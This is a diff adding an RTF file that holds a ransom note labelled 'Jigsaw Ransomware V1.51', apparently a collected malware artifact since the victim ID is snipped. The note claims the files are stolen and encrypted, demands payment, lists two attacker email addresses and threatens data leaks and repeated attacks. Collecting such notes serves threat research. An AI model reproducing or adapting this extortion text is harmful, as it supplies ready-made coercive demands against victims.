@@ -1,0 +1,33 @@
+{\rtf1\ansi\ansicpg1252\cocoartf2761
+\cocoatextscaling0\cocoaplatform0{\fonttbl\f0\fswiss\fcharset0 Helvetica;}
+{\colortbl;\red255\green255\blue255;}
+{\*\expandedcolortbl;;}
+\paperw11900\paperh16840\margl1440\margr1440\vieww11520\viewh8400\viewkind0
+\pard\tx566\tx1133\tx1700\tx2267\tx2834\tx3401\tx3968\tx4535\tx5102\tx5669\tx6236\tx6803\pardirnatural\partightenfactor0
+
+\f0\fs24 \cf0 [~] Jigsaw Ransomware V1.51\
+\
+>>> What's happened?\
+	ALL YOUR FILES ARE STOLEN AND ENCRYPTED.\
+	To recovery your data and not to allow data leakage, it is possible only through purchase of a private key from us.\
+\
+>>> Why trust us?\
+	Before paying you can send us up to 2 files for decryption.\
+	The total size of files must be less than 2MB(non archived).\
+	files should not contain valuable information. (databases, backups, large excel sheets, etc.)\
+\
+>>> WRITE TO US:\
+	Please write an email to both: DecFile@tutanota.com & Decfile@cyberfear.com\
+	Write this Unique-ID in the title of your message: [snip]\
+\
+>>> ATTENTION!\
+	Do not rename or modify encrypted files.\
+	Do not try to decrypt using third party software, it may cause permanent data loss.\
+	Decryption of your files with third parties may cause increased price(they add their fee to our).\
+	We use strong encryption, nobody can restore your files except us.\
+	The price depends on how fast you find us.\
+	remember to hurry up, as your email address may not be available for very long.\
+	All your stolen data will be loaded into cybercriminal forums/blogs if you do not pay ransom.\
+	If you do not pay the ransom we will attack your company repeatedly again.\
+\
+                    }
